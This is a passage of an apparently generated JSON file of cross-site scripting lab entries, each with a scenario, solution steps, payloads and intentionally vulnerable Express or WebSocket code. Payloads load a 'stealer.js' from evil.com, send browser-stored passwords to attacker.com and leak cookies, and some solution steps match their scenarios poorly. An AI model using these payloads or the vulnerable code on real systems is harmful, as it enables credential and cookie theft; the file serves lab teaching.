    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/feedback', (req, res) => {\n  const input = req.query.comment;\n  // Vulnerable reflection\n  res.send(`<h3>Your feedback: ${input}</h3>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via manipulated URL parameters in image preview",
    "Lab Description": "This lab contains an XSS vulnerability in an image preview feature where the image URL is taken directly from a URL parameter and displayed without sanitization. To solve: Inject a payload that triggers JavaScript execution when an image is loaded.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Craft malicious image URL",
      "2. Lure victim to open link",
      "3. Perform CSRF attack"
    ],
    "payloads": [
      "javascript:document.write('<script src=\"https://evil.com/stealer.js\"></script>')",
      "data:image/png;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/preview', (req, res) => {\n  const url = req.query.image;\n  // Vulnerable image rendering\n  res.send(`<img src=\"${url}\" alt=\"Preview\">`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via injected script in WebSocket chat application",
    "Lab Description": "This lab contains an XSS vulnerability in a WebSocket-based chat application where user messages are broadcast to all connected clients without validation. To solve: Inject a malicious script that executes when another user receives the message.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Send malicious chat message",
      "2. Bypass content security policies",
      "3. Perform keystroke logging"
    ],
    "payloads": [
      "<script>navigator.credentials.get({password:true}).then(c => fetch('https://attacker.com?p='+c.password));</script>",
      "<iframe srcdoc='<script>parent.postMessage(document.cookie,\"*\")</script>'>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const WebSocket = require('ws');\\nconst wss = new WebSocket.Server({ port: 8080 });\\n\\nwss.on('connection', (ws) => {\\n  ws.on('message', (msg) => {\\n    // Vulnerable broadcast\\n    wss.clients.forEach(client => {\\n      client.send(`<div class='message'>${msg}</div>`);\\n    });\\n  });\\n});"
  }
  ]
 


